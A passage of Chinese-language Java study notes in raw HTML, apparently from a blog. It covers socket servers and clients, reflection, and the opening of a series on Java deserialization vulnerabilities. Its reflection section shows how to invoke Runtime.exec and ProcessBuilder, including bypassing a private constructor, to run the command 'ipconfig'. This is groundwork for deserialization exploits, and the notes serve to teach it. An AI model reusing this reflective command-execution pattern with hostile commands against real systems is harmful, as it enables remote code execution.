punctuation">&#125;</span></code></pre></li></ol></li><li><p>多线程</p><pre class="language-java" data-language="java"><code class="language-java"><span class="token keyword">import</span> <span class="token import"><span class="token namespace">java<span class="token punctuation">.</span>io<span class="token punctuation">.</span></span><span class="token operator">*</span></span><span class="token punctuation">;</span><span class="token keyword">import</span> <span class="token import"><span class="token namespace">java<span class="token punctuation">.</span>net<span class="token punctuation">.</span></span><span class="token class-name">ServerSocket</span></span><span class="token punctuation">;</span><span class="token keyword">import</span> <span class="token import"><span class="token namespace">java<span class="token punctuation">.</span>net<span class="token punctuation">.</span></span><span class="token class-name">Socket</span></span><span class="token punctuation">;</span><span class="token keyword">public</span> <span class="token keyword">class</span> <span class="token class-name">MultiThreadedServer</span> <span class="token punctuation">&#123;</span>    <span class="token keyword">public</span> <span class="token keyword">static</span> <span class="token keyword">void</span> <span class="token function">main</span><span class="token punctuation">(</span><span class="token class-name">String</span><span class="token punctuation">[</span><span class="token punctuation">]</span> args<span class="token punctuation">)</span> <span class="token keyword">throws</span> <span class="token class-name">IOException</span> <span class="token punctuation">&#123;</span>        <span class="token keyword">int</span> port <span class="token operator">=</span> <span class="token number">12345</span><span class="token punctuation">;</span>        <span class="token class-name">ServerSocket</span> serverSocket <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">ServerSocket</span><span class="token punctuation">(</span>port<span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token class-name">System</span><span class="token punctuation">.</span>out<span class="token punctuation">.</span><span class="token function">println</span><span class="token punctuation">(</span><span class="token string">"Server is listening on port "</span> <span class="token operator">+</span> port<span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token keyword">while</span> <span class="token punctuation">(</span><span class="token boolean">true</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>            <span class="token class-name">Socket</span> socket <span class="token operator">=</span> serverSocket<span class="token punctuation">.</span><span class="token function">accept</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>            <span class="token class-name">System</span><span class="token punctuation">.</span>out<span class="token punctuation">.</span><span class="token function">println</span><span class="token punctuation">(</span><span class="token string">"Client connected"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>            <span class="token keyword">new</span> <span class="token class-name">ClientHandler</span><span class="token punctuation">(</span>socket<span class="token punctuation">)</span><span class="token punctuation">.</span><span class="token function">start</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token punctuation">&#125;</span>    <span class="token punctuation">&#125;</span><span class="token punctuation">&#125;</span><span class="token keyword">class</span> <span class="token class-name">ClientHandler</span> <span class="token keyword">extends</span> <span class="token class-name">Thread</span> <span class="token punctuation">&#123;</span>    <span class="token keyword">private</span> <span class="token class-name">Socket</span> socket<span class="token punctuation">;</span>    <span class="token keyword">public</span> <span class="token class-name">ClientHandler</span><span class="token punctuation">(</span><span class="token class-name">Socket</span> socket<span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>        <span class="token keyword">this</span><span class="token punctuation">.</span>socket <span class="token operator">=</span> socket<span class="token punctuation">;</span>    <span class="token punctuation">&#125;</span>    <span class="token keyword">public</span> <span class="token keyword">void</span> <span class="token function">run</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>        <span class="token keyword">try</span> <span class="token punctuation">&#123;</span>            <span class="token class-name">InputStream</span> input <span class="token operator">=</span> socket<span class="token punctuation">.</span><span class="token function">getInputStream</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>            <span class="token class-name">BufferedReader</span> reader <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">BufferedReader</span><span class="token punctuation">(</span><span class="token keyword">new</span> <span class="token class-name">InputStreamReader</span><span class="token punctuation">(</span>input<span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span>            <span class="token class-name">OutputStream</span> output <span class="token operator">=</span> socket<span class="token punctuation">.</span><span class="token function">getOutputStream</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>            <span class="token class-name">PrintWriter</span> writer <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">PrintWriter</span><span class="token punctuation">(</span>output<span class="token punctuation">,</span> <span class="token boolean">true</span><span class="token punctuation">)</span><span class="token punctuation">;</span>            <span class="token class-name">String</span> line<span class="token punctuation">;</span>            <span class="token keyword">while</span> <span class="token punctuation">(</span><span class="token punctuation">(</span>line <span class="token operator">=</span> reader<span class="token punctuation">.</span><span class="token function">readLine</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token operator">!=</span> <span class="token keyword">null</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>                <span class="token class-name">System</span><span class="token punctuation">.</span>out<span class="token punctuation">.</span><span class="token function">println</span><span class="token punctuation">(</span><span class="token string">"Received: "</span> <span class="token operator">+</span> line<span class="token punctuation">)</span><span class="token punctuation">;</span>                writer<span class="token punctuation">.</span><span class="token function">println</span><span class="token punctuation">(</span><span class="token string">"Server: "</span> <span class="token operator">+</span> line<span class="token punctuation">)</span><span class="token punctuation">;</span>            <span class="token punctuation">&#125;</span>            socket<span class="token punctuation">.</span><span class="token function">close</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token punctuation">&#125;</span> <span class="token keyword">catch</span> <span class="token punctuation">(</span><span class="token class-name">IOException</span> e<span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>            <span class="token class-name">System</span><span class="token punctuation">.</span>out<span class="token punctuation">.</span><span class="token function">println</span><span class="token punctuation">(</span><span class="token string">"Client disconnected"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token punctuation">&#125;</span>    <span class="token punctuation">&#125;</span><span class="token punctuation">&#125;</span></code></pre><p>客户端代码</p><pre class="language-java" data-language="java"><code class="language-java"><span class="token keyword">import</span> <span class="token import"><span class="token namespace">java<span class="token punctuation">.</span>io<span class="token punctuation">.</span></span><span class="token operator">*</span></span><span class="token punctuation">;</span><span class="token keyword">import</span> <span class="token import"><span class="token namespace">java<span class="token punctuation">.</span>net<span class="token punctuation">.</span></span><span class="token class-name">Socket</span></span><span class="token punctuation">;</span><span class="token keyword">public</span> <span class="token keyword">class</span> <span class="token class-name">Client</span> <span class="token punctuation">&#123;</span>    <span class="token keyword">public</span> <span class="token keyword">static</span> <span class="token keyword">void</span> <span class="token function">main</span><span class="token punctuation">(</span><span class="token class-name">String</span><span class="token punctuation">[</span><span class="token punctuation">]</span> args<span class="token punctuation">)</span> <span class="token keyword">throws</span> <span class="token class-name">IOException</span> <span class="token punctuation">&#123;</span>        <span class="token class-name">String</span> hostname <span class="token operator">=</span> <span class="token string">"localhost"</span><span class="token punctuation">;</span>        <span class="token keyword">int</span> port <span class="token operator">=</span> <span class="token number">12345</span><span class="token punctuation">;</span>        <span class="token class-name">Socket</span> socket <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">Socket</span><span class="token punctuation">(</span>hostname<span class="token punctuation">,</span> port<span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token class-name">System</span><span class="token punctuation">.</span>out<span class="token punctuation">.</span><span class="token function">println</span><span class="token punctuation">(</span><span class="token string">"Connected to the server"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token class-name">InputStream</span> input <span class="token operator">=</span> socket<span class="token punctuation">.</span><span class="token function">getInputStream</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token class-name">BufferedReader</span> reader <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">BufferedReader</span><span class="token punctuation">(</span><span class="token keyword">new</span> <span class="token class-name">InputStreamReader</span><span class="token punctuation">(</span>input<span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token class-name">OutputStream</span> output <span class="token operator">=</span> socket<span class="token punctuation">.</span><span class="token function">getOutputStream</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token class-name">PrintWriter</span> writer <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">PrintWriter</span><span class="token punctuation">(</span>output<span class="token punctuation">,</span> <span class="token boolean">true</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        writer<span class="token punctuation">.</span><span class="token function">println</span><span class="token punctuation">(</span><span class="token string">"Hello, server!"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token class-name">String</span> response <span class="token operator">=</span> reader<span class="token punctuation">.</span><span class="token function">readLine</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token class-name">System</span><span class="token punctuation">.</span>out<span class="token punctuation">.</span><span class="token function">println</span><span class="token punctuation">(</span><span class="token string">"Server response: "</span> <span class="token operator">+</span> response<span class="token punctuation">)</span><span class="token punctuation">;</span>        socket<span class="token punctuation">.</span><span class="token function">close</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token punctuation">&#125;</span><span class="token punctuation">&#125;</span></code></pre></li><li><p><code>DatagramSocket</code> 类是 Java 中实现 <code>UDP</code>协议的核心类。与基于 TCP 的 Socket 和 ServerSocket类不同，DatagramSocket类提供了无连接的通信服务，发送和接收数据包。由于无需建立连接，UDP 通常比TCP 更快，但可能不如 TCP 可靠</p></li><li><p><code>DatagramSocket</code> 实例</p><pre class="language-java" data-language="java"><code class="language-java"><span class="token keyword">import</span> <span class="token import"><span class="token namespace">java<span class="token punctuation">.</span>io<span class="token punctuation">.</span></span><span class="token class-name">IOException</span></span><span class="token punctuation">;</span><span class="token keyword">import</span> <span class="token import"><span class="token namespace">java<span class="token punctuation">.</span>net<span class="token punctuation">.</span></span><span class="token class-name">DatagramPacket</span></span><span class="token punctuation">;</span><span class="token keyword">import</span> <span class="token import"><span class="token namespace">java<span class="token punctuation">.</span>net<span class="token punctuation">.</span></span><span class="token class-name">DatagramSocket</span></span><span class="token punctuation">;</span><span class="token keyword">public</span> <span class="token keyword">class</span> <span class="token class-name">UDPServer</span> <span class="token punctuation">&#123;</span>    <span class="token keyword">public</span> <span class="token keyword">static</span> <span class="token keyword">void</span> <span class="token function">main</span><span class="token punctuation">(</span><span class="token class-name">String</span><span class="token punctuation">[</span><span class="token punctuation">]</span> args<span class="token punctuation">)</span> <span class="token keyword">throws</span> <span class="token class-name">IOException</span> <span class="token punctuation">&#123;</span>        <span class="token keyword">int</span> port <span class="token operator">=</span> <span class="token number">12345</span><span class="token punctuation">;</span>        <span class="token class-name">DatagramSocket</span> serverSocket <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">DatagramSocket</span><span class="token punctuation">(</span>port<span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token class-name">System</span><span class="token punctuation">.</span>out<span class="token punctuation">.</span><span class="token function">println</span><span class="token punctuation">(</span><span class="token string">"Server is listening on port "</span> <span class="token operator">+</span> port<span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token keyword">byte</span><span class="token punctuation">[</span><span class="token punctuation">]</span> buffer <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token keyword">byte</span><span class="token punctuation">[</span><span class="token number">1024</span><span class="token punctuation">]</span><span class="token punctuation">;</span>        <span class="token class-name">DatagramPacket</span> packet <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">DatagramPacket</span><span class="token punctuation">(</span>buffer<span class="token punctuation">,</span> buffer<span class="token punctuation">.</span>length<span class="token punctuation">)</span><span class="token punctuation">;</span>        serverSocket<span class="token punctuation">.</span><span class="token function">receive</span><span class="token punctuation">(</span>packet<span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token class-name">String</span> message <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">String</span><span class="token punctuation">(</span>packet<span class="token punctuation">.</span><span class="token function">getData</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">,</span> <span class="token number">0</span><span class="token punctuation">,</span> packet<span class="token punctuation">.</span><span class="token function">getLength</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token class-name">System</span><span class="token punctuation">.</span>out<span class="token punctuation">.</span><span class="token function">println</span><span class="token punctuation">(</span><span class="token string">"Received: "</span> <span class="token operator">+</span> message<span class="token punctuation">)</span><span class="token punctuation">;</span>        serverSocket<span class="token punctuation">.</span><span class="token function">close</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token punctuation">&#125;</span><span class="token punctuation">&#125;</span></code></pre><p>客户端代码</p><pre class="language-java" data-language="java"><code class="language-java"><span class="token keyword">import</span> <span class="token import"><span class="token namespace">java<span class="token punctuation">.</span>io<span class="token punctuation">.</span></span><span class="token class-name">IOException</span></span><span class="token punctuation">;</span><span class="token keyword">import</span> <span class="token import"><span class="token namespace">java<span class="token punctuation">.</span>net<span class="token punctuation">.</span></span><span class="token operator">*</span></span><span class="token punctuation">;</span><span class="token keyword">public</span> <span class="token keyword">class</span> <span class="token class-name">UDPClient</span> <span class="token punctuation">&#123;</span>    <span class="token keyword">public</span> <span class="token keyword">static</span> <span class="token keyword">void</span> <span class="token function">main</span><span class="token punctuation">(</span><span class="token class-name">String</span><span class="token punctuation">[</span><span class="token punctuation">]</span> args<span class="token punctuation">)</span> <span class="token keyword">throws</span> <span class="token class-name">IOException</span> <span class="token punctuation">&#123;</span>        <span class="token class-name">String</span> hostname <span class="token operator">=</span> <span class="token string">"localhost"</span><span class="token punctuation">;</span>        <span class="token keyword">int</span> port <span class="token operator">=</span> <span class="token number">12345</span><span class="token punctuation">;</span>        <span class="token class-name">InetAddress</span> address <span class="token operator">=</span> <span class="token class-name">InetAddress</span><span class="token punctuation">.</span><span class="token function">getByName</span><span class="token punctuation">(</span>hostname<span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token class-name">DatagramSocket</span> clientSocket <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">DatagramSocket</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token class-name">String</span> message <span class="token operator">=</span> <span class="token string">"Hello, server!"</span><span class="token punctuation">;</span>        <span class="token keyword">byte</span><span class="token punctuation">[</span><span class="token punctuation">]</span> buffer <span class="token operator">=</span> message<span class="token punctuation">.</span><span class="token function">getBytes</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token class-name">DatagramPacket</span> packet <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">DatagramPacket</span><span class="token punctuation">(</span>buffer<span class="token punctuation">,</span> buffer<span class="token punctuation">.</span>length<span class="token punctuation">,</span> address<span class="token punctuation">,</span> port<span class="token punctuation">)</span><span class="token punctuation">;</span>        clientSocket<span class="token punctuation">.</span><span class="token function">send</span><span class="token punctuation">(</span>packet<span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token class-name">System</span><span class="token punctuation">.</span>out<span class="token punctuation">.</span><span class="token function">println</span><span class="token punctuation">(</span><span class="token string">"Message sent"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        clientSocket<span class="token punctuation">.</span><span class="token function">close</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token punctuation">&#125;</span><span class="token punctuation">&#125;</span></code></pre></li></ol><h4 id="socket实现http服务器">Socket实现Http服务器</h4><ol type="1"><li><p>Code</p><pre class="language-Java" data-language="Java"><code class="language-Java">&#x2F;&#x2F; HttpMessageParser @Datapublic static class Request &#123;    &#x2F;**     * 请求方法 GET&#x2F;POST&#x2F;PUT&#x2F;DELETE&#x2F;OPTION...     *&#x2F;    private String method;    &#x2F;**     * 请求的uri     *&#x2F;    private String uri;    &#x2F;**     * HTTP版本     *&#x2F;    private String version;    &#x2F;**     * 请求头     *&#x2F;    private Map&lt;String, String&gt; headers;    &#x2F;**     * 请求参数相关     *&#x2F;    private String message;&#125;&#x2F;&#x2F;请求行，包含三个基本要素：请求方法 + URI + HTTP 版本，用空格进行分割&#x2F;** * 根据标准的HTTP协议，解析请求行 * * @param reader * @param request *&#x2F;private static void decodeRequestLine(BufferedReader reader, Request request) throws IOException &#123;    String[] strs &#x3D; StringUtils.split(reader.readLine(), &quot; &quot;);    assert strs.length &#x3D;&#x3D; 3;    request.setMethod(strs[0]);    request.setUri(strs[1]);    request.setVersion(strs[2]);&#125;</code></pre></li><li></li></ol><h3 id="反序列化中的反射1">反序列化中的反射(1)</h3><ol type="1"><li><p>Java的<code>反射（reflection）机制</code>是指在程序的运行状态中，可以构造任意一个类的对象，可以了解任意一个对象所属的类，可以了解任意一个类的成员变量和方法，可以调用任意一个对象的属性和方法。这种动态获取程序信息以及动态调用对象的功能称为Java语言的反射机制。反射被视为<code>动态语言</code>的关键</p></li><li><p>通俗的来说，就是我们可以通过Java的反射机制来获取到任意一个Class、变量、method、instance</p></li><li><p>动态语言可以改变一个变量的类型 -你不用提前定义某个变量的类型，比如<code>Python</code>和<code>PHP</code>,这些语言会在运行时自动探针你的变量类型，而你也可以在代码中随时对这些变量类型进行改变。</p><p>而静态语言例如<code>Java</code>,<code>C/C++</code>,<code>C#</code>就不一样，我们必须事先指定变量类型是<code>String</code>,<code>int</code>,还是<code>double</code></p></li><li><p>都是获取class对象，与<code>.getClass()</code>不同的是,<code>.class</code>是在编译期就被确定,而<code>.getClass()</code>是在运行时调用的</p></li></ol><h4id="java.lang.runtime命令执行及访问private的方法">java.lang.Runtime命令执行及访问private的方法</h4><ol type="1"><li><p>Code</p><pre class="language-java" data-language="java"><code class="language-java"><span class="token class-name">Class</span><span class="token generics"><span class="token punctuation">&lt;</span><span class="token operator">?</span><span class="token punctuation">></span></span> runTimeClass <span class="token operator">=</span> <span class="token class-name">Class</span><span class="token punctuation">.</span><span class="token function">forName</span><span class="token punctuation">(</span><span class="token string">"java.lang.Runtime"</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token comment">//先找到Runtime这个Class的Class类</span><span class="token class-name">Method</span> exec <span class="token operator">=</span> runTimeClass<span class="token punctuation">.</span><span class="token function">getDeclaredMethod</span><span class="token punctuation">(</span><span class="token string">"exec"</span><span class="token punctuation">,</span> <span class="token class-name">String</span><span class="token punctuation">.</span><span class="token keyword">class</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token comment">//找到exec这个method</span><span class="token class-name">Object</span> o1 <span class="token operator">=</span> runTimeClass<span class="token punctuation">.</span><span class="token function">newInstance</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token comment">//创建一个新的Runtime的实例</span>exec<span class="token punctuation">.</span><span class="token function">invoke</span><span class="token punctuation">(</span>o1<span class="token punctuation">,</span><span class="token string">"ipconfig"</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token comment">//在实例中call exec()这个method</span></code></pre><p>代码提示19行出错 - 我们不能访问<code>private</code>属性的成员</p><p><strong>解决办法</strong>：</p><ol type="1"><li><p><strong>getRuntime()</strong></p><pre class="language-java" data-language="java"><code class="language-java"><span class="token class-name">Class</span><span class="token generics"><span class="token punctuation">&lt;</span><span class="token operator">?</span><span class="token punctuation">></span></span> runTimeClass <span class="token operator">=</span> <span class="token class-name">Class</span><span class="token punctuation">.</span><span class="token function">forName</span><span class="token punctuation">(</span><span class="token string">"java.lang.Runtime"</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token comment">//先找到Runtime这个Class</span><span class="token class-name">Method</span> exec <span class="token operator">=</span> runTimeClass<span class="token punctuation">.</span><span class="token function">getDeclaredMethod</span><span class="token punctuation">(</span><span class="token string">"exec"</span><span class="token punctuation">,</span> <span class="token class-name">String</span><span class="token punctuation">.</span><span class="token keyword">class</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token comment">//找到exec这个method</span><span class="token class-name">Method</span> getRuntime <span class="token operator">=</span> runTimeClass<span class="token punctuation">.</span><span class="token function">getDeclaredMethod</span><span class="token punctuation">(</span><span class="token string">"getRuntime"</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token comment">//找到getRuntime()这个method</span><span class="token class-name">Object</span> o1<span class="token operator">=</span>getRuntime<span class="token punctuation">.</span><span class="token function">invoke</span><span class="token punctuation">(</span><span class="token keyword">null</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token comment">//call getRuntime()来获取到Runtime实例</span>exec<span class="token punctuation">.</span><span class="token function">invoke</span><span class="token punctuation">(</span>o1<span class="token punctuation">,</span><span class="token string">"ipconfig"</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token comment">//执行方法</span></code></pre></li><li><p><strong>setAccessible() - 访问private方法</strong></p><pre class="language-java" data-language="java"><code class="language-java"><span class="token class-name">Class</span><span class="token generics"><span class="token punctuation">&lt;</span><span class="token operator">?</span><span class="token punctuation">></span></span> runTimeClass <span class="token operator">=</span> <span class="token class-name">Class</span><span class="token punctuation">.</span><span class="token function">forName</span><span class="token punctuation">(</span><span class="token string">"java.lang.Runtime"</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token comment">//先找到Runtime这个Class</span><span class="token class-name">Method</span> exec <span class="token operator">=</span> runTimeClass<span class="token punctuation">.</span><span class="token function">getDeclaredMethod</span><span class="token punctuation">(</span><span class="token string">"exec"</span><span class="token punctuation">,</span> <span class="token class-name">String</span><span class="token punctuation">.</span><span class="token keyword">class</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token comment">//找到exec这个method</span><span class="token class-name">Constructor</span><span class="token generics"><span class="token punctuation">&lt;</span><span class="token operator">?</span><span class="token punctuation">></span></span> declaredConstructor <span class="token operator">=</span> runTimeClass<span class="token punctuation">.</span><span class="token function">getDeclaredConstructor</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token comment">//不带参数的getConstructor是会获取到无参构造方法的，但因为Runtime的Constructor是private的，所以我们需要使用Declared</span>declaredConstructor<span class="token punctuation">.</span><span class="token function">setAccessible</span><span class="token punctuation">(</span><span class="token boolean">true</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token comment">//禁止java语言访问检查，让我们可以访问这个私有的constructor</span><span class="token class-name">Object</span> o1 <span class="token operator">=</span> declaredConstructor<span class="token punctuation">.</span><span class="token function">newInstance</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token comment">//通过该constructor来创建新的instance</span>exec<span class="token punctuation">.</span><span class="token function">invoke</span><span class="token punctuation">(</span>o1<span class="token punctuation">,</span><span class="token string">"ipconfig"</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token comment">//完成命令执行</span></code></pre></li></ol></li></ol><h4id="java.lang.processbuilder命令执行">java.lang.ProcessBuilder命令执行</h4><ol type="1"><li><p>Code</p><pre class="language-java" data-language="java"><code class="language-java"><span class="token class-name">Class</span><span class="token generics"><span class="token punctuation">&lt;</span><span class="token operator">?</span><span class="token punctuation">></span></span> processBuilderClass <span class="token operator">=</span> <span class="token class-name">Class</span><span class="token punctuation">.</span><span class="token function">forName</span><span class="token punctuation">(</span><span class="token string">"java.lang.ProcessBuilder"</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token comment">//获取到ProcessBuilder这个class</span><span class="token class-name">Method</span> start <span class="token operator">=</span> processBuilderClass<span class="token punctuation">.</span><span class="token function">getDeclaredMethod</span><span class="token punctuation">(</span><span class="token string">"start"</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token comment">//获取到start()这个方法</span><span class="token comment">//因为两个constructor都是public的，所以我们可以只用用getConstructor而不用getDeclaredConstructor</span><span class="token class-name">Object</span> oWithArg <span class="token operator">=</span> processBuilderClass<span class="token punctuation">.</span><span class="token function">getConstructor</span><span class="token punctuation">(</span><span class="token class-name">List</span><span class="token punctuation">.</span><span class="token keyword">class</span><span class="token punctuation">)</span><span class="token punctuation">.</span><span class="token function">newInstance</span><span class="token punctuation">(</span><span class="token class-name">Arrays</span><span class="token punctuation">.</span><span class="token function">asList</span><span class="token punctuation">(</span><span class="token string">"ipconfig"</span><span class="token punctuation">,</span><span class="token string">"/all"</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token comment">//获取带参数的命令的instance</span><span class="token class-name">Object</span> oNoArg <span class="token operator">=</span> processBuilderClass<span class="token punctuation">.</span><span class="token function">getConstructor</span><span class="token punctuation">(</span><span class="token class-name">String</span><span class="token punctuation">[</span><span class="token punctuation">]</span><span class="token punctuation">.</span><span class="token keyword">class</span><span class="token punctuation">)</span><span class="token punctuation">.</span><span class="token function">newInstance</span><span class="token punctuation">(</span><span class="token punctuation">(</span><span class="token class-name">Object</span><span class="token punctuation">)</span> <span class="token keyword">new</span> <span class="token class-name">String</span><span class="token punctuation">[</span><span class="token punctuation">]</span><span class="token punctuation">&#123;</span><span class="token string">"ipconfig"</span><span class="token punctuation">&#125;</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token comment">//获取不带参数的命令的instance</span><span class="token class-name">Process</span> argStart<span class="token operator">=</span><span class="token punctuation">(</span><span class="token class-name">Process</span><span class="token punctuation">)</span> start<span class="token punctuation">.</span><span class="token function">invoke</span><span class="token punctuation">(</span>oWithArg<span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token class-name">Process</span> noArgStart<span class="token operator">=</span><span class="token punctuation">(</span><span class="token class-name">Process</span><span class="token punctuation">)</span> start<span class="token punctuation">.</span><span class="token function">invoke</span><span class="token punctuation">(</span>oNoArg<span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token class-name">InputStream</span> argIn <span class="token operator">=</span> argStart<span class="token punctuation">.</span><span class="token function">getInputStream</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token comment">//获取Process的输出流来作为输入字节流</span><span class="token class-name">InputStream</span> noArgIn <span class="token operator">=</span> noArgStart<span class="token punctuation">.</span><span class="token function">getInputStream</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token comment">//获取Process的输出流来作为输入字节流</span><span class="token class-name">InputStreamReader</span> argReader<span class="token operator">=</span><span class="token keyword">new</span> <span class="token class-name">InputStreamReader</span><span class="token punctuation">(</span>argIn<span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token comment">//把字节流转化为字符流</span><span class="token class-name">InputStreamReader</span> noArgReader<span class="token operator">=</span><span class="token keyword">new</span> <span class="token class-name">InputStreamReader</span><span class="token punctuation">(</span>noArgIn<span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token comment">//把字节流转化为字符流</span><span class="token class-name">BufferedReader</span> argBr<span class="token operator">=</span><span class="token keyword">new</span> <span class="token class-name">BufferedReader</span><span class="token punctuation">(</span>argReader<span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token comment">//为字符流提供缓冲区，以便一次性读取整块数据</span><span class="token class-name">BufferedReader</span> noArgBr<span class="token operator">=</span><span class="token keyword">new</span> <span class="token class-name">BufferedReader</span><span class="token punctuation">(</span>noArgReader<span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token comment">//为字符流提供缓冲区，以便一次性读取整块数据</span><span class="token class-name">String</span> line<span class="token operator">=</span><span class="token keyword">null</span><span class="token punctuation">;</span><span class="token keyword">while</span><span class="token punctuation">(</span><span class="token punctuation">(</span>line<span class="token operator">=</span>argBr<span class="token punctuation">.</span><span class="token function">readLine</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token operator">!=</span><span class="token keyword">null</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span><span class="token comment">//一行行读取</span>    <span class="token class-name">System</span><span class="token punctuation">.</span>out<span class="token punctuation">.</span><span class="token function">println</span><span class="token punctuation">(</span>line<span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token punctuation">&#125;</span><span class="token keyword">while</span><span class="token punctuation">(</span><span class="token punctuation">(</span>line<span class="token operator">=</span>noArgBr<span class="token punctuation">.</span><span class="token function">readLine</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token operator">!=</span><span class="token keyword">null</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span><span class="token comment">//一行行读取</span>    <span class="token class-name">System</span><span class="token punctuation">.</span>out<span class="token punctuation">.</span><span class="token function">println</span><span class="token punctuation">(</span>line<span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token punctuation">&#125;</span></code></pre></li></ol><h3 id="java反序列化漏洞之java-rmi原理流程2">Java反序列化漏洞之JAVARMI原理、流程(2)</h3><h3id="java反序列化漏洞之java反序列化流程与分析3">Java反序列化漏洞之Java反序列化流程与分析(3)</h3><ol type="1"><li><strong>Java反序列化</strong>会根据该二进制流，<strong>重新创建</strong>一个相同状态下的object。Java反序列化不会用<code>constructor</code>来创建一个object，相反，他会创建一个空的object，然后用<strong>Java反射</strong>把数据写进属性里，所以在重新创建object的时候，<code>constructor</code>里的代码是不会被执行的（除了实现Externalizable接口的Class，之后会提到）。<strong>常用readObject()来反序列化Object</strong></li><li>Java在序列化和反序列化的过程中，都用到了<ahref="https://leihehehe.github.io/2021/07/21/Java反序列化漏洞之Java反射机制-1/">Java反射机制</a>（需要注意的是，实现Externalizable接口并不会使用Java反射机制，这一点会在后面的内容中讲到），而整个过程其实就是数据转换为二进制流，再根据数据<strong>重新创建</strong>一个相同的object。</li></ol><h4 id="serializable接口">Serializable接口</h4><ol type="1"><li><p>如果一个Class想要被序列化，那么他<strong>必须</strong><code>implements Serializable</code>。</p><pre class="language-java" data-language="java"><code class="language-java"><span class="token keyword">public</span> <span class="token keyword">class</span> <span class="token class-name">Student</span> <span class="token 